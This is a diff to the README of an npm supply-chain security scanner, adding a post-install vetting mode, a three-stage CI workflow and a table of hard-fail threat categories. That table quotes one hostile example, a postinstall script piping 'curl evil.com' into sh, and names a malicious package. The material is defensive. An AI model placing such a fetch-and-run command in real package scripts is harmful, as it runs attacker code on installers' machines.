@@ -24,6 +24,7 @@ npx @sathyendra/security-checker
 sec-check               # Read-only scan — prints Diagnostic Report only
 sec-check --fix         # Print report, then auto-remediate fixable threats
 sec-check --pre         # Preinstall mode: lockfile + environment scan (no node_modules needed)
+sec-check --post        # Post-install vetting: full scan after npm ci --ignore-scripts
 sec-check --init        # Auto-configure package.json with preinstall & secure-install scripts
 sec-check --approve <p> # Add package <p> to approved list (.sec-check-approved.json)
 sec-check --shield      # Zero Trust Shield: pre-flight → isolated install → post-vetting
@@ -536,6 +537,67 @@ Add to your GitHub Actions workflow:
 ```
 
 Exits `1` on any threat, blocking the pipeline.
+
+### CI Enforcement: Three-Stage Shield
+
+For maximum protection, enforce a **pre → install → post** workflow that prevents any unvetted code from executing. This replaces the traditional `npm ci` → `npm test` pipeline with a defense-in-depth install:
+
+```yaml
+- name: Enforce Security Shield
+  run: |
+    npx @sathyendra/security-checker --pre
+    npm ci --ignore-scripts
+    npx @sathyendra/security-checker --post
+```
+
+| Step | What it does | Hard fail? |
+|---|---|---|
+| `--pre` | Scans lockfile, registry config, env vars, lifecycle scripts, and lockfile hashes **before** any packages are downloaded | Yes — `exit 1` on any critical threat (TeamPCP, compromised hash, HTTP registry, injection) |
+| `npm ci --ignore-scripts` | Downloads packages to disk **without** executing lifecycle hooks (blocks dropper payloads) | N/A |
+| `--post` | Full integrity & security scan on the installed files: provenance, SSRF indicators, swap detection, dependency script vetting, and all other checks | Yes — `exit 1` on any finding |
+
+Combine `--post` with `--fix` to auto-remediate fixable threats before failing:
+
+```yaml
+- name: Enforce Security Shield (with auto-fix)
+  run: |
+    npx @sathyendra/security-checker --pre
+    npm ci --ignore-scripts
+    npx @sathyendra/security-checker --post --fix
+```
+
+For machine-readable output in CI artifacts:
+
+```yaml
+- name: Security Shield (JSON)
+  run: |
+    npx @sathyendra/security-checker --pre --json > pre-scan.json
+    npm ci --ignore-scripts
+    npx @sathyendra/security-checker --post --json > post-scan.json
+- uses: actions/upload-artifact@v4
+  with:
+    name: security-reports
+    path: |
+      pre-scan.json
+      post-scan.json
+```
+
+### Hard Fail Behavior
+
+Both `--pre` and `--post` are **opinionated** — they exit with code `1` whenever threats are detected. There is no "warn-only" mode. This is by design: a supply-chain security tool that can be silently bypassed provides a false sense of security.
+
+Blocking categories that trigger a hard fail:
+
+| Category | Example |
+|---|---|
+| `CRITICAL` | Known malicious package (e.g. `plain-crypto-js`) |
+| `LOCKFILE` | Malicious package in `package-lock.json` dependency tree |
+| `SECRETS` | `.env` file or hardcoded `NPM_TOKEN` / AWS key |
+| `LIFECYCLE_SCRIPT` | `postinstall: "curl evil.com \| sh"` in project scripts |
+| `DEP_SCRIPT` | Risky lifecycle script in a dependency package |
+| `REGISTRY` | Non-official npm registry (Dependency Confusion risk) |
+| `REGISTRY_HTTP` | Unencrypted `http://` registry (MITM risk) |
+| `LOCKFILE_INTEGRITY` | Compromised hash or missing integrity in lockfile |
 
 ## Preinstall strategy
 
